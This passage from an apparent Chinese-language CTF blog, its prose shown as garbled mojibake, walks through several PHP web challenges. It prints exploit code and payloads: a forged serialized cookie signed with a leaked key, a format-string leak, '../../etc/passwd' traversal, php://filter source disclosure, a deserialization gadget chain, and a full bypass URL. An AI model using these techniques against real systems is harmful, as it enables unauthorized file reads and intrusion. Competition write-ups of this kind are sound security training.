class="keyword">parent</span>::response(<span class="string">"session_id ip_address user_agent not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// $ddctf = new Session();</span></span><br><span class="line"><span class="comment">// $ddctf-&gt;index();</span></span><br><span class="line"> </span><br><span class="line">$ar=file_get_contents(<span class="string">'temp.txt'</span>);</span><br><span class="line"> </span><br><span class="line">$ar = substr($ar,<span class="number">0</span>,strlen($ar)<span class="number">-32</span>);</span><br><span class="line"> </span><br><span class="line">$ar=unserialize($ar);</span><br><span class="line">$na=<span class="keyword">new</span> Application();</span><br><span class="line">$na-&gt;path=<span class="string">"..././config/flag.txt"</span>;</span><br><span class="line">array_push($ar,$na);</span><br><span class="line">$ar=serialize($ar);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> $ar.md5(<span class="string">'EzblrbNS'</span>.$ar);</span><br></pre></td></tr></table></figure>
<h3 id="Application-php"><a href="#Application-php" class="headerlink" title="Application.php"></a>Application.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// $DIDICTF_ADMIN = 'admin';</span></span><br><span class="line">        <span class="comment">// if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) &#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;response('æ‚¨å½“å‰å½“å‰æƒé™ä¸ºç®¡ç†å‘˜----è¯·è®¿é—®:app/fL2XID2i0Cdh.php');</span></span><br><span class="line">        <span class="comment">//     return TRUE;</span></span><br><span class="line">        <span class="comment">// &#125;else&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;response('æŠ±æ­‰ï¼Œæ‚¨æ²¡æœ‰ç™»é™†æƒé™ï¼Œè¯·è·å–æƒé™åè®¿é—®-----','error');</span></span><br><span class="line">        <span class="comment">//     exit();</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        $path = trim($path);</span><br><span class="line">        $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">        $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">        <span class="keyword">return</span> $path;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">            <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é˜…è¯»æºç åæ¨æµ‹å¤§æ¦‚æ˜¯åˆ©ç”¨Applicationç±»çš„ææ„å‡½æ•°å®ç°è¯»å–æ–‡ä»¶.åº”è¯¥æ˜¯ååºåˆ—åŒ–</p>
<p>ä½†åœ¨Session.phpä¸­æœ‰ä¸ªcookieçš„MD5çš„éªŒè¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">	<span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125;</span><br><span class="line">$session = unserialize($session);</span><br></pre></td></tr></table></figure>
<p>ä¹‹åæ‰èƒ½ååºåˆ—åŒ–</p>
<p>æ‰€ä»¥éœ€è¦æœ¬åœ°è®¡ç®—md5ç®—å¥½äº†å†å‘è¿‡å»å®ç°é€šè¿‡éªŒè¯</p>
<p>å› æ­¤éœ€è¦çŸ¥é“<code>$this-&gt;eancrykey</code>çš„å€¼æ‰èƒ½æ„é€ MD5å®ç°éªŒè¯</p>
<p>é˜…è¯»Session.phpå‘ç°eancrykeyå¯ä»¥é€šè¿‡æäº¤nicknameå­—æ®µè·å¾—</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">	$arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">	$data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">	<span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">		$data = sprintf($data,$v);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å‘é€å¸¦æœ‰nickname=%sçš„POSTè¯·æ±‚</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/002x03.png" alt="img"></p>
<p>æˆåŠŸè·å–<code>eancrykey</code>çš„å€¼ä¸º<code>EzblrbNS</code></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯åˆ›å»ºä¸€ä¸ªå¸¦æœ‰æ¶æ„æ„é€ çš„ååºåˆ—åŒ–å­—æ®µè¯»å–flagäº†</p>
<p>åœ¨session.phpåˆ›å»ºè‡ªå·±çš„ååºåˆ—åŒ–å¯¹è±¡å¹¶è¾“å‡º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// $ddctf = new Session();</span></span><br><span class="line"><span class="comment">// $ddctf-&gt;index();                  //æ³¨é‡Šæ‰ä¹‹å‰çš„ä»£ç </span></span><br><span class="line"> </span><br><span class="line">$ar=file_get_contents(<span class="string">'temp.txt'</span>);       <span class="comment">//å°†æœåŠ¡å™¨è¿”å›çš„æ­£å¸¸cookieå­˜æ”¾åˆ°temp.txtæ–‡ä»¶ä¸­</span></span><br><span class="line"> </span><br><span class="line">$ar = substr($ar,<span class="number">0</span>,strlen($ar)<span class="number">-32</span>);      <span class="comment">//å»æ‰å°¾éƒ¨çš„md5å€¼</span></span><br><span class="line"> </span><br><span class="line">$ar=unserialize($ar);                      <span class="comment">//ååºåˆ—åŒ–ä¸ºä¸€ä¸ªæ•°ç»„</span></span><br><span class="line">$na=<span class="keyword">new</span> Application();                     <span class="comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡</span></span><br><span class="line">$na-&gt;path=<span class="string">"..././config/flag.txt"</span>;        <span class="comment">//æ„å»ºæ¶æ„è¯»å–è·¯å¾„</span></span><br><span class="line">array_push($ar,$na);                       <span class="comment">//æ·»åŠ åˆ°æ•°ç»„ä¸­</span></span><br><span class="line">$ar=serialize($ar);                        <span class="comment">//åºåˆ—åŒ–æˆå­—ç¬¦ä¸²</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> $ar.md5(<span class="string">'EzblrbNS'</span>.$ar);             <span class="comment">//è¾“å‡ºåºåˆ—åŒ–å¯¹è±¡å’Œkeyä¸åºåˆ—åŒ–å¯¹è±¡çš„md5</span></span><br></pre></td></tr></table></figure>
<p>è®°å¾—è¿™é‡Œå¥½åƒè¦å…ˆè½¬ç å†æ”¾åˆ°temp.txtä¸­ä¸ç„¶ä¼šæœ‰ç¼–ç é—®é¢˜</p>
<p>ç„¶åå°†å¸¦æœ‰æ¶æ„åºåˆ—åŒ–å¯¹è±¡çš„cookieå‘é€è¿‡å»å¯ä»¥çœ‹åˆ°flag</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/002x04.png" alt="img"></p>
<h2 id="DDCTF-Upload-IMG"><a href="#DDCTF-Upload-IMG" class="headerlink" title="DDCTF Upload-IMG"></a>DDCTF Upload-IMG</h2><p>æ¯”èµ›çš„æœ€åä¸€å¤©,æœ¬æƒ³åˆ’åˆ’æ°´ä¸åšé¢˜äº†ç»“æœèˆå‹å´åšå¾—èµ·åŠ².ä¸‹åˆå»ç½‘å§æ‰“äº†ä¼šå®ˆæœ›,æŠŠæ´»åŠ¨å¥–åŠ±é¢†äº†å›æ¥åå‘ç°èˆå‹æœ‰é‡å¤§å‘ç°..</p>
<p>è¿™æ˜¯ä¸€é“webå›¾ç‰‡ä¸Šä¼ é¢˜ç›®</p>
<p>çœ‹è¦æ±‚åº”è¯¥æ˜¯è¦ä¸Šä¼ å›¾ç‰‡shellå¹¶è¦æ±‚ä¸Šä¼ çš„å›¾ç‰‡ç»è¿‡äºŒæ¬¡æ¸²æŸ“åè¿˜æœ‰phpinfo()å­—æ®µ</p>
<p>ç½‘ä¸Šæœ‰ä¸ªå¤–å›½å¤§ç¥å†™çš„è„šæœ¬</p>
<p><a href="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/misc/jpg_payload.php" target="_blank" rel="noopener">è„šæœ¬è¿æ¥</a></p>
<p><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">ä½¿ç”¨æ–¹æ³•1</a></p>
<p><a href="http://digq14n.club/post/25/" target="_blank" rel="noopener">ä½¿ç”¨æ–¹æ³•2</a></p>
<h2 id="æ˜å®‰CTF"><a href="#æ˜å®‰CTF" class="headerlink" title="æ˜å®‰CTF"></a>æ˜å®‰CTF</h2><h3 id="å¤ºå–å°¼æ—¥åˆ©äºš"><a href="#å¤ºå–å°¼æ—¥åˆ©äºš" class="headerlink" title="å¤ºå–å°¼æ—¥åˆ©äºš"></a>å¤ºå–å°¼æ—¥åˆ©äºš</h3><p>æ‹¿åˆ°é¢˜ç›®ã€€è¿™æ˜¯ä¸€é“webé¢˜</p>
<p><a href="http://www.jasec.cn/web1/" target="_blank" rel="noopener">http://www.jasec.cn/web1</a></p>
<p>æ‰“å¼€åå‘ç°ç»™å‡ºäº†æºä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$value = $_GET[<span class="string">'value'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$username = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">    <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'w3lc0me_To_sec_WIki'</span> &amp;&amp; intval($password) &lt; <span class="number">232</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">233</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>é¢˜ç›®æ¥å—<code>value</code>å’Œ<code>password</code>ä¸¤ä¸ªå‚æ•°</p>
<p>ç¬¬ä¸€ä¸ªforå¾ªç¯è¡¨ç¤º<code>value</code>çš„å€¼ä¸ºæ•°ç»„ ä¸”æ¯ä¸€é¡¹çš„å€¼ä¸èƒ½ä¸º<code>32-127</code>ä¹‹é—´çš„å€¼ å¦åˆ™å°†è¢«é”€æ¯</p>
<p>å¦‚æœé€šè¿‡ifæ¡ä»¶è¯­å¥åˆ™æŠŠ<code>value</code>çš„æ¯ä¸€ä¸ªå€¼è½¬æ¢æˆå­—æ¯å¹¶è¿½åŠ åˆ°<code>username</code>åé¢</p>
<p>åˆ¤æ–­<code>username</code>æ˜¯å¦ç­‰äº <code>w3lc0me_To_sec_WIki</code> ä»¥åŠ password çš„å€¼æ˜¯å¦æ»¡è¶³æ¡ä»¶</p>
<p>æˆ‘ä»¬ç°åœ¨æ¥ä¸€ä¸ªä¸€ä¸ªç»•è¿‡è¿™äº›æ¡ä»¶</p>
<p>é¦–å…ˆé¢˜ç›®æ¥å— value çš„å€¼ä¸ºæ•°ç»„ä¸”åæœŸè¦æ•´åˆåˆ° username ä¸­å»</p>
<p>æ‰€ä»¥æˆ‘ä»¬è™½ç„¶è¦ä¼ å…¥å­—ç¬¦ ä½†åˆä¸èƒ½æ˜¯32-127ä¹‹é—´çš„å€¼ å¦åˆ™ä¼šè¢«unsetæ‰</p>
<p>è€Œ<code>php</code>åœ¨æ‰§è¡Œ<code>intval</code>çš„æ—¶å€™ä¼šå…ˆå°†æ•°å­—å–æ¨¡ 256</p>
<p>å°†æ¯ä¸€ä½å­—æ¯çš„asiicå€¼éƒ½å¢åŠ 256å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="string">'w3lc0me_To_sec_WIki'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">    print(<span class="number">256</span>+ord(i))</span><br><span class="line"></span><br><span class="line">    <span class="number">375</span></span><br><span class="line">    <span class="number">307</span></span><br><span class="line">    <span class="number">364</span></span><br><span class="line">    <span class="number">355</span></span><br><span class="line">    <span class="number">304</span></span><br><span class="line">    <span class="number">365</span></span><br><span class="line">    <span class="number">357</span></span><br><span class="line">    <span class="number">351</span></span><br><span class="line">    <span class="number">340</span></span><br><span class="line">    <span class="number">367</span></span><br><span class="line">    <span class="number">351</span></span><br><span class="line">    <span class="number">371</span></span><br><span class="line">    <span class="number">357</span></span><br><span class="line">    <span class="number">355</span></span><br><span class="line">    <span class="number">351</span></span><br><span class="line">    <span class="number">343</span></span><br><span class="line">    <span class="number">329</span></span><br><span class="line">    <span class="number">363</span></span><br><span class="line">    <span class="number">361</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åè¿›è¡Œæ›¿æ¢å¾—åˆ°<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">value[]=<span class="number">375</span>&amp;value[]=<span class="number">307</span>&amp;value[]=<span class="number">364</span>&amp;value[]=<span class="number">355</span>&amp;value[]=<span class="number">304</span>&amp;value[]=<span class="number">365</span>&amp;value[]=<span class="number">357</span>&amp;value[]=<span class="number">351</span>&amp;value[]=<span class="number">340</span>&amp;value[]=<span class="number">367</span>&amp;value[]=<span class="number">351</span>&amp;value[]=<span class="number">371</span>&amp;value[]=<span class="number">357</span>&amp;value[]=<span class="number">355</span>&amp;value[]=<span class="number">351</span>&amp;value[]=<span class="number">343</span>&amp;value[]=<span class="number">329</span>&amp;value[]=<span class="number">363</span>&amp;value[]=<span class="number">361</span></span><br></pre></td></tr></table></figure></p>
<p>ä¹‹åè¦ç»•è¿‡çš„å°±æ˜¯<code>password</code>çš„å€¼è¦å°äº<code>232</code>ä½†åŠ <code>1</code>è¦å¤§äº<code>233</code></p>
<p><code>intval</code>è½¬æ¢çš„è§„åˆ™</p>
<p>å¦‚æœé‡åˆ°æ•°å­—åˆ™è½¬æ¢</p>
<p>å¦‚æœé‡åˆ°éæ•°å­—åˆ™åœæ­¢è½¬æ¢</p>
<p>è¦å°äº<code>232</code>çš„æ˜¯ç›´æ¥ä½¿ç”¨<code>intval</code>è¿›è¡Œè½¬æ¢</p>
<p>è¦å¤§äº<code>233</code>çš„æ˜¯åœ¨è¿›è¡ŒåŠ æ³•åè¿›è¡Œè½¬æ¢</p>
<p>äºæ˜¯æ„é€ </p>
<p><code>password=0x300</code></p>
<p>è¯¥å€¼è½¬æ¢åçš„ç»“æœä¸º<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">769</span><br></pre></td></tr></table></figure></p>
<p>æœ€ç»ˆpayloadä¸º<br><code>http://www.jasec.cn/web1/?password=0x300&amp;value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=371&amp;value[]=357&amp;value[]=355&amp;value[]=351&amp;value[]=343&amp;value[]=329&amp;value[]=363&amp;value[]=361</code></p>
<h2 id="2019å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›"><a href="#2019å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›" class="headerlink" title="2019å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›"></a>2019å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›</h2><p>æ‰“å¼€é¢˜ç›®,åœ¨f12æºä»£ç ä¸­å¯ä»¥å‘ç°æç¤ºæˆ‘ä»¬è®¿é—®<code>index.php?file=xxx.php</code>ä»¥åŠ<code>hint.php</code></p>
<p>è®¿é—®index.php?file=hint.phpæç¤ºç¼ºå°‘å‚æ•°,ä½†çœ‹èµ·æ¥åº”è¯¥æ˜¯æ–‡ä»¶åŒ…å«</p>
<p>æ„é€ <code>/index.php?file=../../../../../../../etc/passwd</code>å¯ä»¥æŸ¥çœ‹åˆ°æœ¬åœ°æ–‡ä»¶</p>
<p>äºæ˜¯æ„é€ </p>
<p><code>/index.php?file=php://filter/read=convert.base64-encode/resource=./index.php</code></p>
<p>å¯ä»¥æŸ¥çœ‹æºä»£ç </p>
<p>æŸ¥çœ‹<code>index.php</code>ä¸<code>hint.php</code>çš„æºä»£ç åå‘ç°</p>
<p>ä¼ å…¥çš„<code>file</code>å‚æ•°ä¼šè¢«åŒ…å«è¿›<code>index.php</code></p>
<p>é™¤æ­¤ä¹‹å¤–è¿˜è¦ä¼ é€’ä¸€ä¸ª<code>payload</code>å‚æ•°</p>
<p>è¯¥å‚æ•°åœ¨åé¢ä¼šè¢«ååºåˆ—åŒ–,ç»“åˆ<code>hint.php</code>é‡Œçš„ä¸¤ä¸ªç±»å¯ä»¥é€ æˆè¯»å–ä»»æ„æ–‡ä»¶.</p>
<h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'url'</span>.$url[<span class="string">'query'</span>].<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'query'</span>.$query.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'url query'</span>.$url[<span class="string">'query'</span>].<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="comment">// print_r(serialize($query));</span></span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123;</span><br><span class="line">    	    <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">    	    <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// $payload = unserialize($payload);</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="hint-php"><a href="#hint-php" class="headerlink" title="hint.php"></a>hint.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°<code>file</code>å‚æ•°å’Œ<code>payload</code>å‚æ•°éƒ½å¯¹<code>flag</code>å­—æ®µè¿›è¡Œäº†è¿‡æ»¤.ä½†æ²¡æœ‰ç›´æ¥å¯¹<code>payload</code>è¿›è¡Œè¿‡æ»¤è€Œæ˜¯å¯¹urlçš„å€¼è¿›è¡Œäº†è¿‡æ»¤</p>
<p>äºæ˜¯æˆ‘ä»¬åœ¨<code>index.php</code>å‰æ·»åŠ <code>///</code>é˜»æ­¢<code>url</code>æ­£å¸¸è·å–å€¼</p>
<p><code>///index.php?file=hint.php</code></p>
<p>ä¸‹ä¸€æ­¥å°±æ˜¯æ„é€ å¸¦æœ‰<code>falg.php</code>çš„åºåˆ—åŒ–å€¼</p>
<p>åœ¨æœ¬åœ°çš„hint.phpä¿®æ”¹ä»£ç ä¸º</p>
